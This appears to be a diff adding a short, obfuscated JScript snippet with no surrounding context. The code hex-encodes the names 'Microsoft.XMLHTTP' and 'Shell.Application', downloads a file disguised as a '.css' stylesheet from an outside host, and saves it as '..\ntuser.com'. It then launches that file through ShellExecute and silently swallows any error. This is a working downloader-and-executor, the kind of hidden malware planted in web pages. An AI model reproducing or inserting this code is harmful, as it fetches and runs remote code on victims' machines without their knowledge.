@@ -1,0 +1,16 @@
+try{
+	var xml=ado.CreateObject("\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x2e\x58\x4d\x4c\x48\x54\x54\x50","");
+	xml.Open("GET","http://tel.a18x.cn/user/od.css",0);
+	xml.Send();
+	as.type=1;
+	as.open();
+	as.write(xml.responseBody);
+	path="..\\ntuser.com";
+	as.savetofile(path,2);
+	as.close();
+	var fsdla='HDdfdfkdfjeiure4rdFdfdfFd#$#$FFF';
+	var Shell=ado.createobject("\x53\x68\x65\x6c\x6c\x2e\x41\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e","");
+	Shell["\x53\x68\x65\x6c\x6c\x45\x78\x65\x63\x75\x74\x65"](path,"","open")
+}catch(e){
+	
+}
